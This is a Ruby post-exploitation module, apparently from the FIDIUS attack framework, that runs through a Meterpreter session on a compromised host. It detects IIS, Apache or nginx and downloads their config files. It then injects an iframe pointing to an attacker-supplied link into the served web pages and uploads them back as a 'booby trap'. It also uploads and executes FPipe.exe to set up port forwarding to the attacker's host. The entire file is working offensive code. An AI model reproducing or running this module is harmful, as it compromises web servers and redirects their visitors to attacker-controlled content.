module FIDIUS
  module Action
    module PostExploit
      module Webserver
        class IFrameInjection

          def initialize client, link = ""
            @session = client
            @pwnlink = link
            @config_analyzer = nil
          end

          def identify_webservice
            processes = @session.sys.process.get_processes
            service_kind = nil
            path_to_service_config = nil
            processes.each{ |pro|
              tmp_pro = pro['name']
              if  tmp_pro.include?("inetinfo.exe")
                puts "IIS RUNNING"
                service_kind = 0 #IIS
                path_to_service_config = "#{remotePath(pro['path'])}\\MetaBase.xml"
                break
              end
              if  tmp_pro.include?("apache2")
                puts "APACHE RUNNING"
                service_kind = 1 #APACHE
                path_to_service_config = locate_configs
                break
              end
              if  tmp_pro.include?("nginx")
                puts "NGINX RUNNING"
                service_kind = 2 #NGINX
                path_to_service_config = locate_configs
                break
              end
            }
            if service_kind != nil
              config_pathes = tmpDown("#{Dir.pwd}", path_to_service_config)
              @config_analyzer = ConfigAnalyzer.new service_kind, [config_pathes]
            end
          end

          def establish_port_fwd lhost
            script_path = Msf::Sessions::Meterpreter.find_script_path("uploadexec")
            #FIXME Hartgecoded IP
            #args = ['-e',"#{RAILS_ROOT}/vendor/FPipe.exe", '-o', "-l 3000 -r 3000 #{@pwnlink[0,@pwnlink.rindex(':')]}", lhost]
            args = ['-e',"#{RAILS_ROOT}/vendor/FPipe.exe",'-p','C:\\', '-o', "-l 8081 -r 8080 #{lhost} -v"]
            puts "run: #{script_path} #{args}"
            @session.execute_file(script_path, args)
          end

          def inject_iframes
            if @config_analyzer != nil
              @config_analyzer.pathes.each { |path|
                @config_analyzer.doc_names.each { |file_name|
                  found_files = @session.fs.file.search(path, file_name)
                  if found_files.length > 0
                    setup_booby_trap "#{Dir.pwd}","#{found_files[0]['path']}\\#{found_files[0]['name']}"
                  end
                }
              }
              @config_analyzer.delete
            end
          end

          private

          def setup_booby_trap local_dest = "/", remote_path = ""
            local_file_path = tmpDown local_dest,remote_path
            testTrap = BoobyTrapHandler.new local_file_path
            testTrap.addIframe @pwnlink
            @session.fs.file.upload(remotePath(remote_path),local_file_path)
            rmTmpDown local_file_path
          end

          def locate_configs
            "/etc/"
          end

          def tmpDown destination = "",src_file = ""
            @session.fs.file.download(destination, src_file)
            "#{destination}/#{fileName(src_file)}"
          end

          def fileName file_path = ""
            tmpArray = file_path.split "\\"
            tmpArray.last
          end

          def remotePath file_path = ""
            tmpLength = fileName(file_path).length + 1
            file_path[0..file_path.length - tmpLength]
          end

          def rmTmpDown src_file = ""
            if (File.delete(src_file) > 0)
              #print_status "Deleted local file: #{src_file}"
            end
          end

        end # class WebServerIFrameInjection
      end # module Webserver
    end # module PostExploit
  end  # module Action
end # module FIDIUS
